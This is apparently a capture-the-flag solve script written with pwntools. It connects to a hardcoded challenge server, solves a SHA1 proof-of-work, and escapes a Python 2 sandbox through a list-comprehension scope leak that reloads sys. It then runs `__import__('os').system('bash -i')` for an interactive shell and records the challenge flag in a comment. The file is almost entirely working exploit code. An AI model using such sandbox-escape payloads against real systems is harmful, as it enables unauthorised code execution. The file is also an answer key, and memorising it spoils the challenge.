import re
import sys

import proofofwork
from pwnlib.tubes.remote import remote

PY2 = sys.version_info[0] < 3


def new_connection():
    return remote('34.92.121.149', 54321)


def solve_pow(conn):
    prefix = re.findall(r'hashlib\.sha1\(input\)\.hexdigest\(\) == "([0-9a-f]{4})"', conn.recvline().decode())[0]

    if PY2:
        prefix = prefix.encode()

    conn.sendlineafter(b'> ', proofofwork.sha1(prefix))


conn = new_connection()
solve_pow(conn)
# Python 2 list comprehension scope leak
conn.sendlineafter(b'$ ', b'[[reload]for[args]in[[sys]]][0][0]114514')  # modify args, reload(sys) to recover sys.stdin and sys.stderr
print(conn.recvline())
solve_pow(conn)
conn.sendlineafter(b'$ ', b'input114514')
conn.sendline(b'__import__("os").system("bash -i")')
conn.interactive()

# *ctf{pYth0n2-f3@tur3_R19ht?}
